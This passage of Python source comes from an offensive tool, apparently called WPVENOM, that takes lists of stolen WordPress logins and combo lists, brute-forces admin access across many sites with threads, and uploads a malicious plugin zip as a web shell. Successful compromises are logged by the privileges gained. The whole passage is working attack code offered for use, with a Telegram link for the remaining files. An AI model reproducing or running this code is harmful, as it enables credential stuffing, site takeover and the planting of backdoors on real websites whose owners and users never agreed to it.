		if D and M:D=D.group(1);M=M.group(1);P={'template':'login','unique_id':D,'up_username':'0','user_action':'','_myuserpro_nonce':M,b:'/profile/login/','action':'userpro_process_form',f"force_redirect_uri-{D}":'0','group':'default',f"redirect_uri-{D}":'','shortcode':'',f"user_pass-{D}":F,f"username_or_email-{D}":E};J.post(f"{L}/wp-admin/admin-ajax.php",data=P,headers=R,verify=_F,timeout=DEFAULT_TIMEOUT)
		d=content_wtf(J.get(f"{L}/wp-admin/",headers=T,verify=_F,timeout=DEFAULT_TIMEOUT))
		if any(A in d for A in[_U,_V,_W,_X]):
			J.get(f"{L}/wp-admin/upgrade.php?step=1",headers=T,verify=_F,timeout=30);H=_Y;log_to_file(_Z,O);K=re.sub(_a,'',B)
			try:e=J.get(f"{K}/wp-admin/plugin-install.php?tab=upload",headers=S,verify=_F,timeout=DEFAULT_TIMEOUT)
			except requests.RequestException:A=_M;display_site_info(_C,B.split(_B)[2],E,F,H,C,G,_A,I,A);return
			N=re.search('id="_wpnonce" name="_wpnonce" value="([^"]*)"',e.text)
			if N:
				N=N.group(1);f={'_wpnonce':N,b:f"{WP_ADMIN_PATH}plugin-install.php?tab=upload",'install-plugin-submit':'Install Now'}
				with open(_N,'rb')as g:
					h={'pluginzip':(_N,g,'application/zip')}
					try:J.post(f"{K}/wp-admin/update.php?action=upload-plugin",data=f,files=h,headers=S,verify=_F,timeout=60);print(f"{Fore.CYAN}> Upload Verification Please Wait {Fore.YELLOW}[{K}]{Fore.RESET}")
					except requests.RequestException:A=_M;display_site_info(_C,B.split(_B)[2],E,F,H,C,G,_A,I,A);return
				try:
					i=requests.get(f"{K}/wp-content/plugins/ttxecy/index.php",timeout=60)
					if _K in i.text:C=_c;G=f"{K}/wp-content/plugins/ttxecy/index.php";log_to_file(_L,G);I=check_uploaded_shells(K)
					else:C=_d
				except:C='Error';A=_e
			else:A=_b
		else:log_to_file(_D,O)
		display_site_info(_C,B.split(_B)[2],E,F,H,C,G,_f,I,A)
	except Exception as j:A=str(j);display_site_info(_C,B.split(_B)[2],E,F,H,C,G,_A,I,A)

def banner():
	print('''\033[31m



                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~


    
                                                  ▗▖ ▗▖▗▄▄▖ ▗▖    ▗▄▖  ▗▄▖ ▗▄▄▄ ▗▄▄▄▖▗▄▄▖ 
                                                  ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌  █▐▌   ▐▌ ▐▌
                                                  ▐▌ ▐▌▐▛▀▘ ▐▌   ▐▌ ▐▌▐▛▀▜▌▐▌  █▐▛▀▀▘▐▛▀▚▖
                                                  ▝▚▄▞▘▐▌   ▐▙▄▄▖▝▚▄▞▘▐▌ ▐▌▐▙▄▄▀▐▙▄▄▖▐▌ ▐▌
                                        
\033[0m
                                                  \033[34m[\033[91m Advanced Wordpress Logs Shell Uploader\033[0m \033[34m]\033[0m
                                                             \033[1;92mAuthor \033[1;91m: \033[1;96m@roothexh\033[0m
''')


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    time.sleep(5)
    os.system('cls' if os.name == 'nt' else 'clear')

    if not os.path.exists(_N):
        print(f"{Fore.RED}→ Can't Find ttxecy.zip{Style.RESET_ALL}")
        print(f"{Fore.CYAN}→ DM To Get All Files https://t.me/roothexh")
        input()
        return

    file_name = input(f"{Back.RED}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/WP-UPLOADER]{Style.RESET_ALL}\n{Back.RED}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.RED}{Fore.WHITE}Enter Your WP Logs Filename (Plugin-install Or Filemanager):")
    J = ask_user_preference()


    try:
        with open(file_name, 'r', encoding=_Q) as K:
            for G in K:
                line = G.strip()
                base_url = line.split('#')[0]
                username, password = extract_credentials(line)

                if not base_url or not username or not password:
                    print(f"{Fore.YELLOW}→ Invalid Line Format: {line}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}→ It Should Be : http://example.com/wp-login.php#Username@Password{Style.RESET_ALL}")
                    continue

                is_connected = EcyAoxen(base_url)
                if not is_connected:
                    pass
                    continue

                if J == '1':
                    perform_tasks_playwright(line, is_connected, username, password)
                else:
                    perform_tasks_requests(line, is_connected, username, password)

    except FileNotFoundError:
        print(f"{Fore.RED}The File {file_name} Not Found{Style.RESET_ALL}")
        time.sleep(2)
        main()
    except Exception as e:
        print(f"{Fore.RED}> An error occurred: {e}{Style.RESET_ALL}")
        main()

#cracker

def URLdomain_roothexh(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    if 'www.' in site:
        site = site.replace("www.", "")
    if '/' in site:
        site = site.rstrip()
        site = site.split('/')[0]
    return site

def content_roothexh(req):
    try:
        return req.text
    except UnicodeDecodeError:
        try:
            return req.content.decode('utf-8')
        except Exception as e:
            print("Error in content: https://t.me/roothexh")
            return None

def URL_P(panel):
    try:
        admins = ['/wp-login.php', '/admin', '/user']
        for admin in admins:
            if admin in panel:
                return re.findall(re.compile('(.*){}'.format(admin)), panel)[0]
        return panel.decode('utf-8') if isinstance(panel, bytes) else panel
    except Exception as e:
        print("Error in URL")
        return None

def WP_Login_UPer(c):
    try:
        c = c.split(':')
        username = c[0]
        password = c[1]
        domain = URLdomain_roothexh(username.split('@')[1])
        url = URL_P(domain)
        if url is None:
            return False
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url    
        doma = URL_P(domain).split('.')[0] 
        user1 = url.split('.')[0]
        user2 = url.replace(".", "")
        user4 = username.split('@')[0]
        user4s = username.replace("@", "")
        user5 = 'admin'
        users = [user4, user5, doma]

        if len(user1) > 8:
            user3 = user1[:8]
            users.insert(2, user3)
        
        for user in users:
            try:
                while url[-1] == '/': 
                    url = url[:-1]
                    
                reqroothexh = requests.session()
                headersLogin = {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                    'referer': '{}/wp-admin/'.format(url)
                }
                
                loginPost_roothexh = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
                
                try: 
                    login_roothexh = reqroothexh.post('{}/wp-login.php'.format(url), data=loginPost_roothexh, headers=headersLogin, verify=False, timeout=30)
                except Exception as ex: 
                    print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}Login Error''')
                    login_roothexh = None
                    
                if login_roothexh is not None and URL_P(login_roothexh.url) != URL_P(url):
                    url = URL_P(login_roothexh.url)
                    reqroothexh = requests.session()
                    loginPost_roothexh = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
                    try: 
                        login_roothexh = reqroothexh.post('{}/wp-login.php'.format(url), data=loginPost_roothexh, headers=headersLogin, verify=False, timeout=30)
                    except Exception as ex: 
                        print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}Login Error''')
                        login_roothexh = None
                if login_roothexh is not None:
                    login_roothexh = content_roothexh(login_roothexh)
                    if 'profile/login' in login_roothexh:
                        id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_roothexh)[0]
                        myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_roothexh)[0]
                        loginPost_roothexh = {
                            'template': 'login', 'unique_id': '{}'.format(id_wp), 'up_username': '0', 'user_action': '',
                            '_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/',
                            'action': 'userpro_process_form',
                            'force_redirect_uri-{}'.format(id_wp): '0', 'group': 'default',
                            'redirect_uri-{}'.format(id_wp): '', 'shortcode': '',
                            'user_pass-{}'.format(id_wp): password, 'username_or_email-{}'.format(id_wp): user
                        }
                        try: 
                            login_roothexh = reqroothexh.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_roothexh, headers=headersLogin, verify=False, timeout=30)
                        except Exception as ex: 
                            print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}Login Error''')
                            login_roothexh = None
                    try: 
                        check = content_roothexh(reqroothexh.get('{}/wp-admin/'.format(url), headers=headersLogin, verify=False, timeout=30))
                    except Exception as ex: 
                        print("Check Error")
                        check = None
                    if check is not None and ('wp-admin/profile.php' in check or 'wp-admin/upgrade.php' in check):
                        with open(os.path.join(combo_dir, "Successfully_logged_WordPress.txt"), "a") as f:
                            f.write('{}/wp-login.php#{}@{}\n'.format(url, user, password))
                        print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE}[!] {url} {user} -> Succeeded Login.{Style.RESET_ALL}')
                        if 'plugin-install.php' in check:
                             with open(os.path.join(combo_dir, "plugin-install.txt"), 'a') as f:
                                f.write('{}/wp-login.php#{}@{}\n'.format(url, user, password))
                        print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE}[!] {url} {user} -> Succeeded plugin-install.{Style.RESET_ALL}')
                        if 'WP File Manager' in check:
                             with open(os.path.join(combo_dir, 'filemanager.txt'), 'a') as f:
                                f.write('{}/wp-login.php#{}@{}\n'.format(url, user, password))
                        print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE}[!] {url} {user} -> Succeeded Wp File Manager.{Style.RESET_ALL}')
                        return True
                    else: 
                        print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[!] {url} > Login Failed{Style.RESET_ALL}''')
                else:
                    print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[!] {url} > Login Failed{Style.RESET_ALL}''')
            except Exception as e:
                print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[!] {url} > Error{Style.RESET_ALL}''')
    except Exception as e:
        print(f'''{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[!] {url} > Error{Style.RESET_ALL}''')
    return False

def exploit(c):
    try:
        c = c.strip()
        print(f'{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[ERROR]{c}{Style.RESET_ALL}')
        WP_Login_UPer(c)
    except:
        pass

def run():
    try:
        target = open(sys.argv[1], 'r')
    except IndexError:
        yList = input(f'''{Back.BLUE}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/Combo-Cracker]{Style.RESET_ALL}\n{Back.BLUE}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}Enter Combo List: ''')
        
        while True:
            try:
                num_threads = int(input(f'''{Back.BLUE}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/Combo-Cracker]{Style.RESET_ALL}\n{Back.BLUE}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}Enter Threads : '''))
                break
            except ValueError:
                print(f"{Back.RED}{Fore.WHITE}Input Valid Number In Threads{Style.RESET_ALL}")
        
        if not os.path.isfile(yList):
            print(f'''\n{Style.RESET_ALL}{Back.RED}{Fore.WHITE}Not Found: {yList}{Style.RESET_ALL}''')
            sys.exit(0)
        
        target = open(yList, 'r')
    
    mp = ThreadPool(num_threads)
    mp.map(exploit, target)
    mp.close()
    mp.join()






def exit_program():
    print(f'''\n{Style.RESET_ALL}{Back.RED}{Fore.WHITE}Have A Nice Day :){Style.RESET_ALL}''')
    sys.exit()


def print_options():
    print(f'''
{Back.GREEN}{Fore.BLACK} Available Options {Style.RESET_ALL}
                                                
                                                [1] Convert Log Format
                                                [2] WP Log Checker
                                                [3] WP Log Uploader
                                                [4] WP Combo Cracker
    ''')

def commands():
    print(f'''
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}exit{Back.CYAN}{Fore.WHITE} To Exit Program{Style.RESET_ALL}
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}options{Back.CYAN}{Fore.WHITE} To Show The Tools Options{Style.RESET_ALL}
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}info{Back.CYAN}{Fore.WHITE} To Show Informations About Every Option Write info 1 To Show Informations On Option "1" And So On{Style.RESET_ALL}
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}clear{Back.CYAN}{Fore.WHITE} To Clear Screen{Style.RESET_ALL}
''')

def print_info(choice_number):
    if choice_number == "1":
        print(f'''
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE} Information about choice [1]: Convert Log Format {Style.RESET_ALL}
{Back.CYAN}{Fore.WHITE}    This Option To Convert URL:LOG:PASS To URL#LOG@PASS{Style.RESET_ALL}
        ''')
    elif choice_number == "2":
        print(f'''
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE} Information about choice [2]: WP Log Checker {Style.RESET_ALL}
{Back.CYAN}{Fore.WHITE}    This Option Check Wordpress Login Logs And Filter Every Success To plugin-install.txt If There is plugin-install permission
    , filemanager.txt if found filemanger plugin already setuped , also check if appearnce permission found AKA themes save it in appearance.txt{Style.RESET_ALL}
        ''')
    elif choice_number == "3":
        print(f'''
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE} Information about choice [3]: WP Log Uploader {Style.RESET_ALL}
{Back.CYAN}{Fore.WHITE}    This Option Upload Shell On Wordpress Logs 
    Also Check Domains On The Shell That Already Uploaded And Upload Shell On Every Domain Found On The Domain Paths{Style.RESET_ALL}
        ''')

    elif choice_number == "4":
        print(f'''
{Style.RESET_ALL}{Back.BLUE}{Fore.WHITE} Information about choice [4]: WP Combo Cracker {Style.RESET_ALL}
{Back.CYAN}{Fore.WHITE}    This Options Crack Wordpress Logins By Combo list mail:pass user:pass{Style.RESET_ALL}
''')   
    else:
        print("Invalid choice number for info")


if __name__ == "__main__":
    main_banner()
    while True:
        choice = input(f'''
                       
{Back.YELLOW}{Fore.WHITE}Write "{Fore.BLUE}commands{Style.RESET_ALL}{Back.YELLOW}{Fore.WHITE}" To See All Commands{Style.RESET_ALL}

{Back.RED}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu]{Style.RESET_ALL}
{Back.RED}{Fore.WHITE}└─$ {Style.RESET_ALL}''')

        choice_parts = choice.strip().split()

        if len(choice_parts) == 1:
            if choice_parts[0] == "1":
                clear_console()
                format_banner()
                convert_format()
            elif choice_parts[0] == "2":
                clear_console()
                checker_banner()
                wp_check()
            elif choice_parts[0] == "3":
                banner()
                main()
            elif choice_parts[0] == "4" :
                clear_console()
                cracker_banner()
                run()
            elif choice_parts[0].lower() == "options":
                clear_console()
                print_options()
            elif choice_parts[0].lower() == "clear" :
                clear_console()
            elif choice_parts[0].lower() == "exit" :
                exit_program()
            elif choice_parts[0].lower() == "commands" :
                clear_console()
                commands()
            else:
                pass
            
        elif len(choice_parts) == 2:
            command = choice_parts[0].lower()
            argument = choice_parts[1]

            if command == "info":
                clear_console()
                print_info(argument)
            else:
                print("Invalid command or format. Use 'info <number>'.")
        else:
            print("Invalid input format. Please try again.")
